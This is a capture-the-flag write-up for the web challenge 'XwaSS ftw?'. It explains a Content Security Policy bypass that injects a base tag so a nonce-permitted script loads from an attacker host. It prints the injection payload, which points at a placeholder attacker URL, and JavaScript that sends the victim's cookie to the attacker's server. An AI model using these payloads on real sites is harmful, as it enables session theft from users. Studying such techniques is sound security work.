<hr />

<h2>description: Content Security Policy bypass using base tag</h2>

<h1>XwaSS ftw?</h1>

<blockquote>
  <p>Just another typical web challenge that will be solved anyway :/\
  Link: http://128.199.3.34:1236</p>
  
  <p><strong>Author:</strong> Kahla</p>
</blockquote>

<p>In this challenge, we have HTML injection through the <code>src=</code> parameter, but the CSP does not allow the loading of arbitrary scripts.</p>

<p><code>markup
&lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-6kzZgPLe1fqRq8';connect-src 'self';style-src 'self';font-src 'self';object-src 'none'"&gt;
</code></p>

<p>Thankfully, the following script is included in the response, which is permitted by the <code>nonce</code>.</p>

<p><code>markup
&lt;script nonce=6kzZgPLe1fqRq8  src="assets/js/bootstrap.js"&gt;
</code></p>

<p>We could therefore use the <code>&lt;base&gt;</code> tag to set the base URL of the document to our attacker-controlled site.</p>

<p><code>html
?src=/img/saturn.jpg'&gt;&lt;base href="http://ATTACKER_URL"&gt;
</code></p>

<p>This will load the script <code>http://ATTACKER_URL/assets/js/bootstrap.js</code>, which we can host on our server:</p>

<p>```javascript
let img = document.createElement('img');
img.src = "/?" + btoa(document.cookie)</p>

<p>document.body.appendChild(img);
```</p>

<p>The above payload will cause the browser to fetch <code>/?${document.cookie}</code>, which will be logged on our server, allowing us to get the admin's cookie.</p>
